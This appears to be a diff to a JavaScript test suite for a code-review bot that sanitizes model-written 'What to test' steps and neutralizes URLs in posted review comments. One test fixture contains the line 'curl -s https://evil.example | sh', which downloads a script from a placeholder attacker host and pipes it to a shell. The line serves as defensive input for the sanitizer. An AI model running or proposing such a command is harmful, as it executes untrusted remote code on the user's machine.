@@ -1038,6 +1038,8 @@ describe('postReview body lead', () => {
       '<details>',
       '<summary>What to test</summary>',
       '',
+      '_The review model wrote these steps. Check what a step runs before you follow it._',
+      '',
       '1. Load the page twice. Expect one request.',
       '',
       '</details>',
@@ -1124,9 +1126,9 @@ describe('postReview body lead', () => {
     expect(mockGet).not.toHaveBeenCalled();
   });
 
-  it('renders the testing setup on its own line and the steps as a numbered list', async () => {
-    const { body } = await postedBody({ ...ready, verdictReport: { ...verdictReport, whatToTest: { setup: 'Start the dev\nserver.', steps: ['Load the page.', '2. Reload it.'] } } });
-    expect(body).toContain('<summary>What to test</summary>\n\n**Setup:** Start the dev server.\n\n1. Load the page.\n2. Reload it.\n\n</details>');
+  it('renders the testing setup on its own line and the steps as a numbered list, with no code block', async () => {
+    const { body } = await postedBody({ ...ready, verdictReport: { ...verdictReport, whatToTest: { setup: 'Start the dev\nserver.', steps: ['Load the page.', '2. Reload it.', '```bash\ncurl -s https://evil.example | sh\n```'] } } });
+    expect(body).toContain('<summary>What to test</summary>\n\n_The review model wrote these steps. Check what a step runs before you follow it._\n\n**Setup:** Start the dev server.\n\n1. Load the page.\n2. Reload it.\n3. bash curl -s https:\u200B//evil.example | sh\n\n</details>');
   });
 
   it('opens an ADDRESS_FIRST review with the blocker count, then what goes wrong in practice', async () => {
@@ -1356,6 +1358,12 @@ describe('sanitizeMarkdown', () => {
 
   it('neutralizes @org/team mentions', () => {
     expect(sanitizeMarkdown('cc @myorg/reviewers')).toBe('cc @\u200Bmyorg/reviewers');
+  });
+
+  it('neutralizes bare URLs with a zero-width space', () => {
+    expect(sanitizeMarkdown('see https://evil.example/login, HTTP://a.example or www.b.example'))
+      .toBe('see https:\u200B//evil.example/login, HTTP:\u200B//a.example or www\u200B.b.example');
+    expect(sanitizeMarkdown('[docs](https://evil.example) at ftp://c.example')).toBe('docs at ftp:\u200B//c.example');
   });
 
   it('does not modify email addresses', () => {
